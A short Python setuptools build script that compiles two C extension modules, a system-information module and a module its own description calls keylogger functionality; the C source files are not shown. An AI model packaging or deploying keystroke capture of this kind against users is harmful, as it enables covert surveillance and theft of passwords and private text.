from setuptools import setup, Extension

pcinfo_module = Extension(
    'pcinfo',
    sources=['info.c'],
)

keylogger_module = Extension(
    'keylogger',
    sources=['keylogger.c'],
)

setup(
    name='pcinfo',
    version='0.1',
    description='C modules that provide PC information and keylogger functionality',
    ext_modules=[pcinfo_module, keylogger_module],
)
